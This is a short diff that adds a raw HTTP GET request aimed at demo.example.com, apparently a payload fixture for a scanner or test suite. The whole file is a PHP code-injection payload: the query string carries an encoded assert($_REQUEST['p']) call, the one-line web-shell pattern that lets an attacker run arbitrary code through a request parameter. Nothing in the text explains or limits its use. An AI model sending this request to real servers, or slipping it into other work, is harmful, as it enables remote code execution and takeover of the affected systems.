@@ -1,0 +1,4 @@
+GET /a?file=@assert($_REQUEST[%26%23x27;p%26%23x27;]); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
